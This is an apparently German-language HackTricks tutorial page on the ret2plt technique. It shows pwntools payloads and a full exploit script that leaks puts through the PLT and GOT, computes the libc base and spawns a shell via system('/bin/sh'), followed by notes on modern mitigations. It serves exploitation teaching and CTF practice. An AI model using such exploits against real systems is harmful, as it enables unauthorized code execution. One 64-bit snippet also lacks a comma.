# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Ziel dieser Technik ist es, **leak eine Adresse einer Funktion aus der PLT** zu erhalten, um ASLR umgehen zu können. Das liegt daran, dass du zum Beispiel die Adresse der Funktion `puts` aus der libc leakst; du kannst dann **berechnen, wo die Basis von `libc` ist** und Offsets berechnen, um auf andere Funktionen wie **`system`** zuzugreifen.

Dies kann mit einem `pwntools` payload wie ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Beachte, wie **`puts`** (unter Verwendung der Adresse aus der PLT) mit der Adresse von `puts` aufgerufen wird, die sich im GOT (Global Offset Table) befindet. Das liegt daran, dass zu dem Zeitpunkt, wenn `puts` den GOT-Eintrag von puts ausgibt, dieser **Eintrag die genaue Adresse von `puts` im Speicher enthalten wird**.

Beachte außerdem, wie die Adresse von `main` im Exploit verwendet wird, sodass wenn `puts` seine Ausführung beendet, die **binary `main` erneut aufruft statt zu beenden** (so the leaked address will continue to be valid).

> [!CAUTION]
> Beachte, dass dafür die **binary nicht mit PIE kompiliert sein darf** oder du einen **leak gefunden haben musst, um PIE zu bypassen**, um die Adresse der PLT, GOT und main zu kennen. Andernfalls musst du zuerst PIE umgehen.

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Dies war das finale Exploit aus diesem **Beispiel**:

<details>
<summary>Vollständiges Exploit-Beispiel (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Moderne Überlegungen

- **`-fno-plt` builds** (häufig in modernen Distributionen) ersetzen `call foo@plt` durch `call [foo@got]`. Wenn das Binary keinen `foo@plt`-Stub hat, kannst du trotzdem die aufgelöste Adresse mit `puts(elf.got['foo'])` leaken und dann **direkt zum GOT-Eintrag zurückkehren** (`flat(padding, elf.got['foo'])`), um in libc zu springen, sobald lazy binding abgeschlossen ist.
- **Full RELRO / `-Wl,-z,now`**: GOT ist schreibgeschützt, aber ret2plt funktioniert weiterhin für leaks, weil du nur den GOT‑Slot liest. Wenn das Symbol nie aufgerufen wurde, führt dein erster ret2plt außerdem lazy binding aus und gibt dann den aufgelösten Slot aus.
- **ASLR + PIE**: Wenn PIE aktiviert ist, leak zuerst einen Code-Pointer (z. B. gespeicherte Rücksprungadresse, Funktionszeiger oder `.plt`-Eintrag via einem anderen format‑string/infoleak), um die PIE-Base zu berechnen, und baue dann die ret2plt-Kette mit den neu positionierten PLT/GOT-Adressen.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT-Einträge sind gültige BTI-Landing-Pads (`bti c`), daher sollte man bei der Ausnutzung von BTI-aktivierten Binaries bevorzugt in den PLT-Stub springen (oder in ein anderes BTI-annotiertes Gadget) statt direkt in ein libc-Gadget ohne BTI, andernfalls wird die CPU `BRK`/`PAC`-Fehler auslösen.
- **Quick resolution helper**: Wenn die Ziel-Funktion noch nicht aufgelöst ist und du in einem einzigen Schritt einen leak brauchst, kette den PLT-Aufruf zweimal: zuerst `elf.plt['foo']` (um aufzulösen), dann nochmal `elf.plt['foo']` mit der GOT-Adresse als Argument, um den nun befüllten Slot auszugeben.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
